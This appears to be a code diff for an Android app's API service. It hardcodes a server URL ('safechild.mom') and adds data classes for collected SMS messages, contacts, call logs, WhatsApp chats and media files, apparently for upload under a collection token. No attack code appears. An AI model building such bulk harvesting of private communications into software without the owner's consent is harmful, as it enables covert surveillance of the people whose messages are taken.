@@ -24,7 +24,7 @@ class ApiService(private val context: Context) {
         .build()
 
     private val gson = Gson()
-    private val baseUrl = BuildConfig.SERVER_URL
+    private val baseUrl = "https://safechild.mom/api"
 
     /**
      * Validate collection token with server
@@ -237,4 +237,18 @@ data class CollectionStats(
     val callLogCount: Int,
     val mediaCount: Int,
     val whatsappBackupFound: Boolean
+)
+
+data class CollectedData(
+    val smsMessages: List<Map<String, Any?>>,
+    val contacts: List<Map<String, Any?>>,
+    val callLogs: List<Map<String, Any?>>,
+    val whatsappData: WhatsAppData?,
+    val mediaFiles: List<String>
+)
+
+data class WhatsAppData(
+    val backupFound: Boolean,
+    val messages: List<Map<String, Any?>>,
+    val chats: List<Map<String, Any?>>
 )
